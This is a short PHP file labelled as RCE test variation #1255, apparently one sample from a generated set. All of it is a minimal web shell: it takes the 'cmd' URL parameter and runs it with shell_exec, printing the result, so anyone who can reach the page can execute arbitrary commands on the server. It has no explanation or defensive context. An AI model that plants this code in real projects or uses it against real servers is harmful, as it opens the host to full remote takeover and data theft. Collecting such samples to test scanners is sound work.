<?php
// RCE test variation #1255
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>